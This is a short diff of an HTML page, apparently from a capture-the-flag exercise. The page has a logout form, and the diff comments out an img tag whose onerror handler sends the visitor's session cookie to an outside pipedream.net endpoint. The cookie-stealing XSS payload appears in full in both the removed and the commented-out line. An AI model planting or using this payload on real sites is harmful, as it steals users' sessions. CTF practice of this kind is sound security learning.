@@ -13,6 +13,6 @@
         <form action="/hackthebox/ctflogout" method="POST">
             <input type="submit" value="로그아웃" name="logout" />
         </form>
-        <img src="error.png" onerror="location.href='https://eodhhttu9beaqkb.m.pipedream.net?cookie='+document.cookie" />
+        <!-- <img src="error.png" onerror="location.href='https://eodhhttu9beaqkb.m.pipedream.net?cookie='+document.cookie" /> -->
     </body>
 </html>
